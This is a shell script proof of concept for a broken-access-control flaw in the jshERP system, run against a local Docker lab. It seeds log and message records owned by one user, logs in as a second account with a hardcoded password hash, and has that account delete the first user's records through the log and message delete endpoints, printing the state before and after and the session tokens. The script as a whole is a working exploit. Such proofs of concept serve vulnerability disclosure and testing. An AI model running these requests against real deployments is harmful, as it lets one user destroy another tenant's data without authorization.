#!/bin/sh
set -e
BASE='http://127.0.0.1:9999/jshERP-boot'
STAMP=$(date +%s)
LOG_MARK="poc-log-owner-63-$STAMP"
MSG_MARK="poc-msg-owner-63-$STAMP"

login_token() {
  user="$1"
  docker exec jsherp33-app sh -lc "curl -s -X POST $BASE/user/login -H 'Content-Type: application/json' -d '{\"loginName\":\"$user\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\"}'" \
  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
}

# Seed victim-owned objects (user_id=63, tenant_id=63)
docker exec jsherp33-mysql sh -lc "mysql -ujsherp -p123456 -D jsh_erp -e \"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'POC_LOG','127.0.0.1',NOW(),0,'$LOG_MARK',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('$MSG_MARK','poc',NOW(),'系统',63,'1',63,'0');\""

LOG_ID=$(docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id FROM jsh_log WHERE content='$LOG_MARK' ORDER BY id DESC LIMIT 1;\"" | tail -n 1)
MSG_ID=$(docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id FROM jsh_msg WHERE msg_title='$MSG_MARK' ORDER BY id DESC LIMIT 1;\"" | tail -n 1)

TOKEN_TEST="$(login_token test123)"
TOKEN_JSH="$(login_token jsh)"

echo "[Seed] log_id=$LOG_ID msg_id=$MSG_ID"

echo "[Before] victim rows"
docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=$LOG_ID; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=$MSG_ID;\""

echo "[PoC-1] test123 deletes jsh log"
docker exec jsherp33-app sh -lc "curl -s -X DELETE '$BASE/log/delete?id=$LOG_ID' -H 'X-Access-Token: $TOKEN_TEST'"

echo "\n[PoC-2] test123 deletes jsh msg"
docker exec jsherp33-app sh -lc "curl -s -X DELETE '$BASE/msg/delete?id=$MSG_ID' -H 'X-Access-Token: $TOKEN_TEST'"

echo "\n[After] victim rows"
docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=$LOG_ID; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=$MSG_ID;\""

echo "[Context]"
echo "jsh token: $TOKEN_JSH"
echo "test123 token: $TOKEN_TEST"
